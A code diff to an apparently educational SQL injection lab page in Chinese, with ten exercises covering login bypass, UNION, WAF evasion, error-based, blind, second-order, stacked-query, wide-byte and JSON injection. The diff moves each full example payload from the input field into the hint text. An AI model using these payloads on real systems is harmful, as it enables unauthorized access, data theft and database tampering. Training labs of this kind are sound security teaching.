@@ -188,17 +188,17 @@
         <p><strong>目標：</strong> 輸入特定 SQL 語句破壞驗證邏輯，繞過密碼檢查成功登入 <code>admin</code>。</p>
         <div class="form-group">
             <label>Username</label>
-            <input type="text" id="l1_user" value="admin' --">
+            <input type="text" id="l1_user" value="" placeholder="請輸入使用者名稱 Payload，例如 admin' --">
         </div>
         <div class="form-group">
             <label>Password</label>
-            <input type="password" id="l1_pass" value="anything">
+            <input type="password" id="l1_pass" value="" placeholder="任意密碼">
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab1()">送出 Payload</button>
             <button class="hint-btn" onclick="toggleHint(1)">💡 提示</button>
         </div>
-        <div id="hint1" class="hint-box">提示：使用單引號 <code>'</code> 閉合欄位，並加上註解符號 <code>--</code> 將密碼比對邏輯忽略。</div>
+        <div id="hint1" class="hint-box">提示：使用單引號 <code>'</code> 閉合欄位，並加上註解符號 <code>--</code> 將密碼比對邏輯忽略。參考 Payload：<code>admin' --</code></div>
     </div>
 
     <!-- Lab 2 -->
@@ -207,13 +207,13 @@
         <p><strong>目標：</strong> 使用 <code>UNION SELECT</code> 跨表查詢，撈出隱藏在 <code>secret_flags</code> 資料表中的 Flag。</p>
         <div class="form-group">
             <label>User ID Search</label>
-            <input type="text" id="l2_id" value="1 UNION SELECT 1, flag_value, 'flag_found' FROM secret_flags">
+            <input type="text" id="l2_id" value="" placeholder="請輸入搜尋 ID 或 UNION Payload">
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab2()">搜尋數據</button>
             <button class="hint-btn" onclick="toggleHint(2)">💡 提示</button>
         </div>
-        <div id="hint2" class="hint-box">提示：確保 UNION 後方的欄位數量與前方的 <code>id, username, role</code> (3個欄位) 相同。</div>
+        <div id="hint2" class="hint-box">提示：確保 UNION 後方的欄位數量與前方的 <code>id, username, role</code> (3個欄位) 相同。參考 Payload：<code>1 UNION SELECT 1, flag_value, 'flag_found' FROM secret_flags</code></div>
     </div>
 
     <!-- Lab 3 -->
@@ -222,13 +222,13 @@
         <p><strong>目標：</strong> 後端設有 WAF 黑名單，過濾了 <code>UNION</code>, <code>SELECT</code> 與空格。請嘗試繞過過濾。</p>
         <div class="form-group">
             <label>Username Search</label>
-            <input type="text" id="l3_input" value="UnIOn/**/SeLeCt">
+            <input type="text" id="l3_input" value="" placeholder="請輸入繞過 WAF 的 Payload">
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab3()">送出 Payload</button>
             <button class="hint-btn" onclick="toggleHint(3)">💡 提示</button>
         </div>
-        <div id="hint3" class="hint-box">提示：可以使用 SQL 註解 <code>/**/</code> 代替空格，或使用大小寫混淆/雙寫關鍵字。</div>
+        <div id="hint3" class="hint-box">提示：可以使用 SQL 註解 <code>/**/</code> 代替空格，或使用大小寫混淆/雙寫關鍵字。參考 Payload：<code>UnIOn/**/SeLeCt</code></div>
     </div>
 
     <!-- Lab 4 -->
@@ -237,13 +237,13 @@
         <p><strong>目標：</strong> 系統會回傳詳細的資料庫錯誤訊息，請利用 SQL 爆錯將資料庫內的 Flag 隨錯誤訊息帶出。</p>
         <div class="form-group">
             <label>User ID</label>
-            <input type="text" id="l4_id" value="1 AND (SELECT CAST(flag_value AS INT) FROM secret_flags)">
+            <input type="text" id="l4_id" value="" placeholder="請輸入報錯注入 Payload">
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab4()">執行查詢</button>
             <button class="hint-btn" onclick="toggleHint(4)">💡 提示</button>
         </div>
-        <div id="hint4" class="hint-box">提示：強制將字串類型的 <code>flag_value</code> 轉型為整數 (INT)，SQLite 轉型失敗時會將原始字串列在報錯訊息中。</div>
+        <div id="hint4" class="hint-box">提示：強制將字串類型的 <code>flag_value</code> 轉型為整數 (INT)，SQLite 轉型失敗時會將原始字串列在報錯訊息中。參考 Payload：<code>1 AND (SELECT CAST(flag_value AS INT) FROM secret_flags)</code></div>
     </div>
 
     <!-- Lab 5 -->
@@ -252,13 +252,13 @@
         <p><strong>目標：</strong> 頁面不會顯示資料或報錯，只會回傳 <code>exists: true/false</code>。請盲猜出 Flag 內容。</p>
         <div class="form-group">
             <label>Check Username</label>
-            <input type="text" id="l5_user" value="admin' AND SUBSTR((SELECT flag_value FROM secret_flags), 1, 1) = 'F">
+            <input type="text" id="l5_user" value="" placeholder="請輸入布林測試 Payload">
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab5()">檢測條件</button>
             <button class="hint-btn" onclick="toggleHint(5)">💡 提示</button>
         </div>
-        <div id="hint5" class="hint-box">提示：利用 <code>SUBSTR(string, pos, length)</code> 測試字元。若回傳 exists: true，代表猜對該位置的字母。</div>
+        <div id="hint5" class="hint-box">提示：利用 <code>SUBSTR(string, pos, length)</code> 測試字元。若回傳 exists: true，代表猜對該位置的字母。參考 Payload：<code>admin' AND SUBSTR((SELECT flag_value FROM secret_flags), 1, 1) = 'F</code></div>
     </div>
 
     <!-- Lab 6 -->
@@ -267,13 +267,13 @@
         <p><strong>目標：</strong> 無論輸入什麼，頁面皆回傳固定狀態。請透過觸發伺服器回應延遲 (Delay) 進行判斷。</p>
         <div class="form-group">
             <label>Profile ID</label>
-            <input type="text" id="l6_id" value="1' AND DELAY --">
+            <input type="text" id="l6_id" value="" placeholder="請輸入時間盲注 Payload">
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab6()">發送並測量時間</button>
             <button class="hint-btn" onclick="toggleHint(6)">💡 提示</button>
         </div>
-        <div id="hint6" class="hint-box">提示：觀察回應面板右側顯示的 <code>Execution Time</code>，若超過 2000ms 代表成功觸發延遲條件。</div>
+        <div id="hint6" class="hint-box">提示：觀察回應面板右側顯示的 <code>Execution Time</code>，若超過 2000ms 代表成功觸發延遲條件。參考 Payload：<code>1' AND DELAY --</code></div>
     </div>
 
     <!-- Lab 7 -->
@@ -282,7 +282,7 @@
         <p><strong>目標：</strong> 第一步先寫入包含惡意語法的簡介；第二步呼叫觸發點，讓資料庫讀出該語法並二次執行。</p>
         <div class="form-group">
             <label>Step 1: 更新 Bio (寫入 Payload)</label>
-            <input type="text" id="l7_bio" value="guest' OR '1'='1">
+            <input type="text" id="l7_bio" value="" placeholder="請輸入要植入資料庫的 Bio">
         </div>
         <div class="btn-group" style="margin-bottom: 15px;">
             <button class="action-btn" onclick="submitLab7Update()">1. 儲存 Bio</button>
@@ -291,7 +291,7 @@
             <button class="action-btn" style="background: #00e5ff;" onclick="submitLab7Trigger()">2. 觸發二次渲染</button>
             <button class="hint-btn" onclick="toggleHint(7)">💡 提示</button>
         </div>
-        <div id="hint7" class="hint-box">提示：儲存時單引號會被正常存入資料庫，直到第二次 Query 被拼接到 Update 語句時才會爆發。</div>
+        <div id="hint7" class="hint-box">提示：儲存時單引號會被正常存入資料庫，直到第二次 Query 被拼接到 Update 語句時才會爆發。參考 Payload：<code>guest' OR '1'='1</code></div>
     </div>
 
     <!-- Lab 8 -->
@@ -300,13 +300,13 @@
         <p><strong>目標：</strong> 使用分號 <code>;</code> 堆疊執行第二道 SQL 指令，對資料庫發動修改或破壞。</p>
         <div class="form-group">
             <label>Stacked Command</label>
-            <input type="text" id="l8_cmd" value="UPDATE users SET role = 'admin' WHERE id = 2;">
+            <input type="text" id="l8_cmd" value="" placeholder="請輸入包含分號的堆疊指令">
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab8()">堆疊執行</button>
             <button class="hint-btn" onclick="toggleHint(8)">💡 提示</button>
         </div>
-        <div id="hint8" class="hint-box">提示：分號允許在一筆 Request 中連續執行多條獨立的 SQL 語句 (如 UPDATE / INSERT)。</div>
+        <div id="hint8" class="hint-box">提示：分號允許在一筆 Request 中連續執行多條獨立的 SQL 語句 (如 UPDATE / INSERT)。參考 Payload：<code>UPDATE users SET role = 'admin' WHERE id = 2;</code></div>
     </div>
 
     <!-- Lab 9 -->
@@ -315,13 +315,13 @@
         <p><strong>目標：</strong> 後端會強制將單引號轉義為 <code>\'</code>。請利用多位元組字元將斜線 <code>\</code> 吃掉。</p>
         <div class="form-group">
             <label>Name Parameter</label>
-            <input type="text" id="l9_name" value="%df' OR 1=1 --">
+            <input type="text" id="l9_name" value="" placeholder="請輸入吃掉反斜線的 Payload">
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab9()">發送 Payload</button>
             <button class="hint-btn" onclick="toggleHint(9)">💡 提示</button>
         </div>
-        <div id="hint9" class="hint-box">提示：<code>%df</code> 與 <code>\</code> (%5c) 組合時會被解碼為一個繁體/寬位元組字元，從而還原單引號。</div>
+        <div id="hint9" class="hint-box">提示：<code>%df</code> 與 <code>\</code> (%5c) 組合時會被解碼為一個繁體/寬位元組字元，從而還原單引號。參考 Payload：<code>%df' OR 1=1 --</code></div>
     </div>
 
     <!-- Lab 10 -->
@@ -330,13 +330,13 @@
         <p><strong>目標：</strong> 現代 API 常接收 JSON 格式。請在 JSON 的屬性值中注入 SQL 語法。</p>
         <div class="form-group">
             <label>JSON Body</label>
-            <textarea id="l10_json" rows="4">{"id": "1 OR 1=1"}</textarea>
+            <textarea id="l10_json" rows="4" placeholder='{"id": "1"}'></textarea>
         </div>
         <div class="btn-group">
             <button class="action-btn" onclick="submitLab10()">發送 JSON 請求</button>
             <button class="hint-btn" onclick="toggleHint(10)">💡 提示</button>
         </div>
-        <div id="hint10" class="hint-box">提示：後端未對 JSON 提取出的 Value 做型態檢查便直拼進 SQL。</div>
+        <div id="hint10" class="hint-box">提示：後端未對 JSON 提取出的 Value 做型態檢查便直拼進 SQL。參考 Payload：<code>{"id": "1 OR 1=1"}</code></div>
     </div>
 
     <!-- 控制台 Console -->
@@ -409,7 +409,6 @@
             setTimeout(() => {
                 timerEl.innerText = `Execution Time: ${delayMs}ms`;
                 consoleEl.innerText = JSON.stringify(data, null, 2);
-                // 已移除自動把 Flag 帶入輸入框的程式碼，保持輸入框空白供使用者手動輸入
             }, delayMs);
         }
 
